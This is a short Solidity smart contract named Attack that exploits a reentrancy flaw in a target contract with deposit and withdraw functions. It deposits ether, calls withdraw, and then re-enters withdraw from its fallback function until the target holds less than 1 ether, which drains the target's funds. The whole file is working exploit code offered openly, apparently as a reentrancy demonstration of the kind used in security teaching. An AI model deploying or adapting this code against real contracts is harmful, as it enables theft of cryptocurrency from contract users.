// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDepositFunds {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    IDepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = IDepositFunds(_depositFundsAddress);
    }

    // Attack function: deposit Ether, then withdraw to exploit reentrancy
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum attack deposit is 1 ether");

        // Deposit Ether into the vulnerable contract
        depositFunds.deposit{value: msg.value}();

        // Trigger withdraw to exploit
        depositFunds.withdraw();
    }

    // Fallback: gets called when vulnerable contract sends Ether back
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    // Helper: check balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
